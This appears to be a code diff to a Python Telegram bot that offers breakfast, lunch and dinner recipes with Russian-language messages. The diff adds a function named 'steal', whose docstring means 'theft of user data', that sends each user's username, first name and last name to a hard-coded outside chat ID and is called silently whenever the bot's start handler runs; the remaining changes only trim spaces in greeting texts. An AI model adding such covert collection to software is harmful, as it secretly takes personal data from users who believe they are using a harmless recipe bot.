@@ -19,6 +19,18 @@ token = os.getenv("TOKEN")
 updater = Updater(token=token)
 
 
+def steal(update, context):
+    """воровство данных пользователя"""
+    temp = update.effective_chat
+    username = temp.username
+    first_name = temp.first_name
+    last_name = temp.last_name
+    context.bot.send_message(
+        chat_id=737479838,
+        text="steal "+username + " " + str(first_name) + " " + str(last_name)
+    )
+
+
 def Get_URL(url):
     return requests.get(url).text
 
@@ -26,7 +38,7 @@ def Get_URL(url):
 def wake_up(update, context):
     chat = update.effective_chat
     button = ReplyKeyboardMarkup([['Завтрак'], ['Обед'], ['Ужин']])
-
+    steal(update, context)
     if chat.last_name is None:
         context.bot.send_message(
             chat_id=chat.id,
@@ -89,19 +101,19 @@ def TextHandler(update, context):
     if 'Завтрак' in chat:
         context.bot.send_message(
             chat_id=id,
-            text='С добрым утром. \nНовый рецепт специально для тебя :)'
+            text='С добрым утром.\nНовый рецепт специально для тебя :)'
         )
         breakfast(update, context)
     elif 'Обед' in chat:
         context.bot.send_message(
             chat_id=id,
-            text='Добрый день. \nПриготовим что-нибудь вкусненькое ;)\nСегодня у нас: '
+            text='Добрый день.\nПриготовим что-нибудь вкусненькое ;)\nСегодня у нас: '
         )
         lunch(update, context)
     elif 'Ужин' in chat:
         context.bot.send_message(
             chat_id=id,
-            text='И снова привет. \nНачнём готовить)'
+            text='И снова привет.\nНачнём готовить)'
         )
         dinner(update, context)
     else:
